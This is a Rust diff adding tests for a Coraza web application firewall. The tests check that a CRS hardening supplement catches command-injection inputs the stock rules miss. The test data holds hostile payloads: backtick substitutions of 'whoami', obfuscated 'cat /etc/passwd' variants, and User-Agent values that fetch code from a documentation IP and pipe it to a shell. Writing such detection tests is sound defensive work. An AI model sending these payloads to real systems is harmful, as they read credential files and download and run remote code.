@@ -29,14 +29,15 @@ use std::{fmt::Write as _, path::Path, sync::OnceLock};
 
 use coraza::{
     Waf,
-    seclang::{Parser, RECOMMENDED_CONF},
+    seclang::{CRS_HARDENING_CONF, Parser, RECOMMENDED_CONF},
 };
 
 /// The CRS tree fetched by `make crs-fetch`.
 const CRS: &str = concat!(env!("CARGO_MANIFEST_DIR"), "/../envoy-coraza/crs");
 
-/// The recommended configuration, blocking, then the CRS at `paranoia`, or `None` without the tree.
-fn compile(paranoia: u8, multiphase: bool) -> Option<Waf> {
+/// The recommended configuration, blocking, then the CRS at `paranoia` and, with `hardening`, the supplement
+/// `CRS_HARDENING_CONF` after it, or `None` without the tree.
+fn compile(paranoia: u8, multiphase: bool, hardening: bool) -> Option<Waf> {
     if !Path::new(CRS).join("rules").is_dir() {
         eprintln!("skipped: no CRS tree at {CRS}; run `make crs-fetch`");
         return None;
@@ -53,6 +54,9 @@ fn compile(paranoia: u8, multiphase: bool) -> Option<Waf> {
              Include {CRS}/rules/*.conf\n"
         ))
         .unwrap();
+    if hardening {
+        parser.from_string(CRS_HARDENING_CONF).unwrap();
+    }
     Some(parser.into_waf().unwrap())
 }
 
@@ -69,7 +73,24 @@ fn engines(paranoia: u8) -> &'static [Waf] {
     cell.get_or_init(|| {
         [false, true]
             .into_iter()
-            .filter_map(|multiphase| compile(paranoia, multiphase))
+            .filter_map(|multiphase| compile(paranoia, multiphase, false))
+            .collect()
+    })
+}
+
+/// Like `engines`, with `CRS_HARDENING_CONF` loaded after the CRS, for `paranoia` 1 and 3.
+fn hardened_engines(paranoia: u8) -> &'static [Waf] {
+    static PL1: OnceLock<Vec<Waf>> = OnceLock::new();
+    static PL3: OnceLock<Vec<Waf>> = OnceLock::new();
+    let cell = match paranoia {
+        1 => &PL1,
+        3 => &PL3,
+        _ => unreachable!("hardened_engines serves paranoia levels 1 and 3, not {paranoia}"),
+    };
+    cell.get_or_init(|| {
+        [false, true]
+            .into_iter()
+            .filter_map(|multiphase| compile(paranoia, multiphase, true))
             .collect()
     })
 }
@@ -227,6 +248,27 @@ fn crs_932140_sees_a_powershell_backtick_before_a_windows_keyword() {
     }
 }
 
+/// The values of the 932238 known miss below, which the supplement catches at PL3.
+const BACKTICK_COMMAND_STARTS: [&str; 17] = [
+    "foo`whoami`",
+    "foo`whoami",
+    "`~`whoami",
+    "echo `whoami`",
+    "x;`whoami`",
+    ")`whoami`",
+    "echo `\"whoami\"`",
+    ">`whoami",
+    "a(`whoami`",
+    "a)`whoami`",
+    "a,`whoami`",
+    "a;`whoami`",
+    "a<`whoami`",
+    "a>`whoami`",
+    "x,`whoami`",
+    "for /f %i `in(`whoami`) do echo %i",
+    "for /f \"usebackq\" %i in (`whoami`) do echo %i",
+];
+
 /// Known miss, pinned so a rule-file fix flips it: `t:cmdLine` removes a backtick unless the next
 /// byte that is not removed is `~`, so PL3 rule 932238 loses it as a command start, in a word
 /// (``Proc`ess`` has the same bytes) and at a word start (the 932140 shapes above need it removed). Each
@@ -234,25 +276,7 @@ fn crs_932140_sees_a_powershell_backtick_before_a_windows_keyword() {
 /// at PL3 its inbound score drops by 5.
 #[test]
 fn crs_932238_known_miss_of_a_backtick_command_start() {
-    for value in [
-        "foo`whoami`",
-        "foo`whoami",
-        "`~`whoami",
-        "echo `whoami`",
-        "x;`whoami`",
-        ")`whoami`",
-        "echo `\"whoami\"`",
-        ">`whoami",
-        "a(`whoami`",
-        "a)`whoami`",
-        "a,`whoami`",
-        "a;`whoami`",
-        "a<`whoami`",
-        "a>`whoami`",
-        "x,`whoami`",
-        "for /f %i `in(`whoami`) do echo %i",
-        "for /f \"usebackq\" %i in (`whoami`) do echo %i",
-    ] {
+    for value in BACKTICK_COMMAND_STARTS {
         for (waf, multiphase) in engines(3).iter().zip([false, true]) {
             let (interruption, matched) = run(waf, &query(value), None, b"");
             assert!(
@@ -347,5 +371,151 @@ fn crs_932140_sees_a_backtick_loop_variable() {
         for paranoia in 1..=3 {
             assert_blocked_by(paranoia, 932_140, &query(value), None, b"");
         }
+    }
+}
+
+/// `CRS_HARDENING_CONF` catches what the known miss above pins: PL3 rule 10932238 reads the backtick without
+/// `t:cmdLine`. Under multiphase evaluation (the connector's mode) it is the rule that matches; without it the
+/// CRS interrupts first in phase 2 and the supplement's rules after it never run. At PL1 the rule is off, and every
+/// value still blocks through the CRS rules named in the pin.
+#[test]
+fn crs_hardening_catches_the_backtick_command_starts_932238_misses() {
+    for value in BACKTICK_COMMAND_STARTS {
+        for (waf, multiphase) in hardened_engines(3).iter().zip([false, true]) {
+            let (interruption, matched) = run(waf, &query(value), None, b"");
+            assert_eq!(
+                matched.contains(&10_932_238),
+                multiphase,
+                "10932238 on {value:?} (multiphase={multiphase}), matched {matched:?}"
+            );
+            assert!(
+                interruption.is_some(),
+                "{value:?} blocks at PL3 (multiphase={multiphase}), matched {matched:?}"
+            );
+        }
+        for (waf, multiphase) in hardened_engines(1).iter().zip([false, true]) {
+            let (interruption, matched) = run(waf, &query(value), None, b"");
+            assert!(
+                !matched.contains(&10_932_238),
+                "10932238 is a PL3 rule: {value:?} at PL1 (multiphase={multiphase})"
+            );
+            assert_eq!(
+                interruption,
+                Some(949_110),
+                "{value:?} still blocks at PL1 (multiphase={multiphase}), matched {matched:?}"
+            );
+        }
+    }
+}
+
+/// A substitution that prints nothing, written inside a word (`c`~`at`, `c`:`at`, `c`true`at`, `c$()at`), is a
+/// `cat` that passes the CRS at PL1 here and in Go. Rule 10932130 of the supplement denies it, in a query argument and
+/// in a custom header, without and with multiphase evaluation.
+#[test]
+fn crs_hardening_denies_a_command_substitution_that_prints_nothing_inside_a_word() {
+    for value in [
+        ";c`~`at /e`~`tc/pa`~`sswd",
+        ";c`:`at /e`:`tc/pa`:`sswd",
+        ";c`true`at /e`true`tc/pa`true`sswd",
+        ";c$()at /e$()tc/pa$()sswd",
+        "who``ami",
+        "wh`~`oami",
+        "l`:`s",
+    ] {
+        for ((crs, hardened), multiphase) in engines(1).iter().zip(hardened_engines(1)).zip([false, true]) {
+            let (interruption, _) = run(crs, &query(value), None, b"");
+            assert_eq!(
+                interruption, None,
+                "the CRS alone passes {value:?} (multiphase={multiphase})"
+            );
+            let (interruption, matched) = run(hardened, &query(value), None, b"");
+            assert_eq!(
+                interruption,
+                Some(10_932_130),
+                "{value:?} in a query (multiphase={multiphase}), matched {matched:?}"
+            );
+            let (interruption, matched) = run_with_headers(hardened, "/", None, b"", &[("X-Custom-Data", value)]);
+            assert_eq!(
+                interruption,
+                Some(10_932_130),
+                "{value:?} in a header (multiphase={multiphase}), matched {matched:?}"
+            );
+        }
+    }
+}
+
+/// The supplement reads a `User-Agent` for rule 932235 through its own copy of the operator (rule 10932235, phase 1),
+/// which skips the strict shape of Composer's `User-Agent` (`cURL 8.5.0` reads as the command `curl`). A command in the
+/// header, bare or behind a Composer shape, scores like the CRS rule, and a Composer `User-Agent` passes. The CRS alone
+/// passes every one of them at PL1. Without and with multiphase evaluation.
+#[test]
+fn crs_hardening_reads_the_user_agent_for_932235_except_composers() {
+    let composer = [
+        "Composer/2.8.2 (Linux; 6.8.0-49-generic; PHP 8.3.13; cURL 8.5.0)",
+        "Composer/2.7.7 (Darwin; 23.5.0; PHP 8.2.20; cURL 8.7.1)",
+        "Composer/2.6.6 (Windows NT; 10.0; PHP 8.1.27; cURL 8.4.0)",
+        "Composer/2.8.4 (Linux; 5.15.153.1-microsoft-standard-WSL2; PHP 8.4.1; cURL 8.11.0; Platform-PHP 8.1.0)",
+        "Composer/2.8.1 (Linux; 6.1.0-26-amd64; PHP 8.3.12; cURL 7.88.1; CI)",
+        "Composer/2.8.3 (Linux; 6.10.14-linuxkit; PHP 8.3.14; cURL 8.10.1; Docker)",
+        "Composer/2.8.3 (Linux; 6.10.14-linuxkit; PHP 8.3.14; cURL 8.10.1; Platform-PHP 8.2.0; CI; Docker)",
+        "Composer/2.2.22 (Linux; 5.4.0-196-generic; PHP 7.4.33; streams)",
+        "Composer/2.8.2 (FreeBSD; 14.1-RELEASE; PHP 8.3.13; cURL 8.10.1)",
+        "Composer/2.9.0-RC1 (Linux; 6.8.0-49-generic; PHP 8.4.1; cURL 8.11.0)",
+        "Composer/2.8.2+bc4a6c4 (Linux; 6.8.0-49-generic; PHP 8.3.13; cURL 8.5.0)",
+    ];
+    let commands = [
+        ";curl 203.0.113.9/s|sh",
+        "Composer/2.8.2 (Linux; 6.8.0; PHP 8.3.13; cURL 8.5.0); curl 203.0.113.9|sh",
+        "Composer/2.8.2 (Linux; 6.8.0; PHP 8.3.13; cURL 8.5.0 && curl 203.0.113.9|sh)",
+        "Composer/2.8.2 (Linux; x curl http://203.0.113.9/s -o /tmp/s; PHP 8.3.13; cURL 8.5.0)",
+    ];
+    for ((crs, hardened), multiphase) in engines(1).iter().zip(hardened_engines(1)).zip([false, true]) {
+        for value in composer {
+            for (waf, name) in [(crs, "the CRS alone"), (hardened, "the supplement")] {
+                let (interruption, matched) = run_with_headers(waf, "/", None, b"", &[("User-Agent", value)]);
+                assert_eq!(
+                    interruption, None,
+                    "{name} passes {value:?} (multiphase={multiphase}), matched {matched:?}"
+                );
+            }
+        }
+        for value in commands {
+            let (interruption, _) = run_with_headers(crs, "/", None, b"", &[("User-Agent", value)]);
+            assert_eq!(
+                interruption, None,
+                "the CRS alone passes {value:?} (multiphase={multiphase})"
+            );
+            let (interruption, matched) = run_with_headers(hardened, "/", None, b"", &[("User-Agent", value)]);
+            assert_eq!(
+                interruption,
+                Some(949_110),
+                "{value:?} scores through 10932235 or another retargeted rule (multiphase={multiphase}), matched {matched:?}"
+            );
+        }
+    }
+}
+
+/// The log line of rule 10932235 names what matched and where, like the CRS rule it copies.
+#[test]
+fn crs_hardening_logs_what_10932235_matched_in_the_user_agent() {
+    for waf in hardened_engines(1) {
+        let mut tx = waf.new_transaction();
+        tx.process_uri("/", "GET", "HTTP/1.1");
+        tx.add_request_header("Host", "example.com");
+        tx.add_request_header("User-Agent", ";curl 203.0.113.9/s|sh");
+        tx.process_request_headers();
+        let matched = tx.matched_rules();
+        let rule = matched.iter().find(|rule| rule.rule_id() == 10_932_235).unwrap();
+        assert!(
+            rule.data()
+                .contains("found within REQUEST_HEADERS:User-Agent: ;curl 203.0.113.9/s|sh"),
+            "log data of 10932235: {:?}",
+            rule.data()
+        );
+        assert!(
+            rule.data().starts_with("Matched Data: "),
+            "log data of 10932235: {:?}",
+            rule.data()
+        );
     }
 }
